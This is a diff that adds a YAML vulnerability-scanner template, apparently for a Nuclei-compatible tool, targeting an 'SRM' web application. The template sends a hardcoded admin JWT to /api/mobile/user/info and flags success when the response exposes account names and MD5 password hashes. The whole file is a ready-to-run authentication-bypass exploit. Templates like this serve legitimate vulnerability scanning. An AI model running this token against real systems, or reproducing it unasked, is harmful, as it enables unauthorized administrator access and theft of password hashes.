@@ -1,0 +1,37 @@
+id: srm-auth-token
+
+info:
+  name: srm-auth-token
+  author: Safety_man
+  severity: high
+  description: auth_jwt_token
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+  yakit-info:
+    sign: 564e05a1c6b824b6b80898d0fb3d705d
+
+http:
+- method: POST
+  path:
+  - '{{RootURL}}/api/mobile/user/info'
+  headers:
+    Authorization: Bearer:eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIxIiwiaWF0IjoxNzYzNTE0Mzk0LCJzdWIiOiJ7XCJhY2NvdW50TmFtZVwiOlwiYWRtaW5cIixcImlkXCI6MSxcImVudGVycHJpc2VJZFwiOjF9IiwiZXhwIjoxOTIzODU5MjIwfQ.hjEGWcE21Q9kGkALcC4rI9ZPg5K3wr71oGe6Ao8t3VU
+    Content-Length: "34"
+    Content-Type: application/x-www-form-urlencoded
+    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
+      Gecko) Chrome/39.0.2171.71 Safari/537.36
+
+  max-redirects: 3
+  disable-cookie: true
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - md5Passwords
+    - accountName
+
+
+# Generated From WebFuzzer on 2025-11-19 10:09:28
